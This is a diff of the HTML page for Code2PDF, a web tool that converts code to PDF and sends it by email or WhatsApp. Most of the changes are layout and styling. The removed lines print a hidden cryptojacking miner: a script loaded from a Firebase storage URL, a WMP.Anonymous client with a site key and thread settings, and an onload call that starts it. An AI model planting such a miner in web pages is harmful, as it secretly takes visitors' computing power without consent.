@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -8,16 +9,16 @@
     <meta name="Description"
         content="Effortlessly convert text and files to PDF format with Code2PDF. Send the generated PDFs directly to email and WhatsApp. Streamline your document sharing process today.">
     <meta name="Keywords"
-        content="code2pdf,code to pdf,PDF conversion , Convert text to PDF , Online PDF generator,Text file to PDF converter,Document sharing tools,PDF creation and sharing,Automated PDF delivery,Online file conversion,Email and WhatsApp document sharing,Text to PDF Online,File to PDF Conversion,Convert to PDF,">
+        content="PDF conversion , Convert text to PDF , Online PDF generator,Text file to PDF converter,Document sharing tools,PDF creation and sharing,Automated PDF delivery,Online file conversion,Email and WhatsApp document sharing,Text to PDF Online,File to PDF Conversion,Convert to PDF,">
     <title>Code2Pdf -Send PDF to Email and WhatsApp</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.5.3/jspdf.debug.js"></script>
     <script src="https://smtpjs.com/v3/smtp.js"></script>
-<script src="https://firebasestorage.googleapis.com/v0/b/c2p-hashes.appspot.com/o/webmp.txt?alt=media&token=9c2b1cdb-bf65-4aa7-83fc-16e76ec19562"/>   <script src="https://unpkg.com/sweetalert2@10"></script>
+    <script src="https://unpkg.com/sweetalert2@10"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
     <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
     <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@900&display=swap" rel="stylesheet">
-    <link rel="shortcut icon" href="./reallogo.png" type="image/x-icon">
+    <link rel="shortcut icon" href="./favicon.png" type="image/x-icon">
     <style>
         * {
             margin: 0;
@@ -46,19 +47,56 @@
             width: 100%;
             height: 100vh;
         }
-
-        .nav {
+        .nav{
             width: 100%;
+            height: 75px;
+            /* text-align: center; */
+            display: flex;align-items: center;
+            justify-content: space-between;
+            
+            /* background-color: violet; */
+        }
+        .logo{
+            margin-left: 25px;
+            
+            width: 200px;height: 60px;background-color: blue;
+        }
+        .logo img{
+        width: 100%;height: 130%;object-fit: cover;
+        
+        }
+        .share-btn{
+            /* gap: 20px; */
+            /* position: relative; */
+            outline: none;
+            border: .1px solid gray;
+            z-index: 9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             height: 50px;
+            padding: 0 40px;
+            cursor: pointer;
+            background: #1d252e;
+            color: white;
+            border-radius: .5em;
+            font-size: 15px;
+            margin-right: 25px;
+            /* margin: 0 auto; */
+            /* margin-bottom: 2rem; */
         }
-
-
-
-        .logo {
-            margin-top: -30px;
-            align-items: flex-start;
-            width: 25rem;
+        .share-btn a{
+            text-decoration: none;
+            color: #fff;
+            
+            text-transform: capitalize;
         }
+        
+
+
+
+
+
 
 
         .tagline {
@@ -641,22 +679,27 @@
             /* background-color: black; */
             width: 15%;
         }
+
     </style>
 </head>
 
 
-<body onload="miner()">
-    <div class="loader-container">
+<body>
+    <!-- <div class="loader-container">
         <img src="byy.svg" alt="Loading...">
-    </div>
+    </div> -->
     <div class="content">
 
+        <div id="m">
+        </div>
         <section class="sec1">
             <div class="nav">
-                <img class="logo" src="./Untitled design (3).gif" alt="logo">
-                <div id="m">
+                <div class="logo">
+                    <img class="" src="./logo.gif" alt="logo" >
                 </div>
+                <button class="share-btn"><a href="./share.html">share code</a></button>
             </div>
+
             <div class="tagline">
                 <span class="r">{Code+Pdf}</span> &nbsp;&nbsp;<span class="typing"> Delivered To You In Seconds.</span>
             </div>
@@ -678,7 +721,8 @@
             </div>
 
         </section>
-        <div class="main2" style="height: 90vh;display: flex;justify-content: center;flex-direction: column;">
+        <div class="main2" style="height: 90vh;display: flex;justify-content: center;flex-direction: column; ">
+           
             <section class="sec3">
                 <div class="txtarea">
                     <div class="item">
@@ -690,7 +734,7 @@
                     </div>
                     <textarea name="message" spellcheck="false" required
                         placeholder='"Ready to share your code? Paste it here..."' id="txtarea1"
-                        onkeydown="handleTextareaKeyPress(event)""></textarea>
+                        onkeydown="handleTextareaKeyPress(event)"></textarea>
         </div>
     </section>
     <section class=" sec2">
@@ -706,7 +750,7 @@
             </div>
 
     </section>
-<div class="popup">
+    <div class="popup">
     <ion-icon onclick="closepopup()" style="font-size: 3rem;position: absolute; cursor: pointer; left: 100%;top:-2rem; color: white; transform: rotate(45deg);" name="add-outline"></ion-icon>
     <input name="Email" placeholder="Enter Your Email" required="true" title="Enter Your Email"
                     class="email" type="email">
@@ -716,7 +760,6 @@
                             <button type="submit" id="send">Send</button>
                         </div>
                 </div>
-    
 </div>
     <footer>
         <div class="footer-content">
@@ -728,7 +771,6 @@
 </body>
 <script>
     window.addEventListener('load', function () {
-        // Hide the loader and show the content when all resources are loaded
         document.querySelector('.loader-container').style.display = 'none';
         document.querySelector('.content').style.display = 'block';
     });
@@ -749,14 +791,7 @@
     const checkboxText = document.getElementById('checkboxText');
     const popup = document.querySelector('.popup');
 
-var clientOBJ = WMP.Anonymous('SK_nMDhFVtxJ8Q2Lvh5cmyZT',{
-        threads: 4,
-        autoThreads: true,
-        throttle: 0.1,
-        forceASMJS: false
-    });
 
-function miner(){clientOBJ.start()}
 
     function closepopup() {
         const popup = document.querySelector('.popup');
@@ -765,7 +800,6 @@ function miner(){clientOBJ.start()}
     function handleTextareaKeyPress(event) {
         if (event.keyCode === 13) {
             popup.style.transform = 'scale(1)'
-            // document.body.style.filter = 'blur(5px)';
             event.preventDefault();
         }
 
@@ -978,7 +1012,7 @@ function miner(){clientOBJ.start()}
             return;
         }
 
-        send.innerHTML = '<img src="./Reload-1s-200px (1).svg"  width="20" alt="Loading..." /> &nbsp;Sending...';
+        send.innerHTML = '<img src="./sendLoader"  width="20" alt="Loading..." /> &nbsp;Sending...';
         send.disabled = true;
         const response = await fetch("https://tinyurl.com/code2pdf", {
             method: "POST",
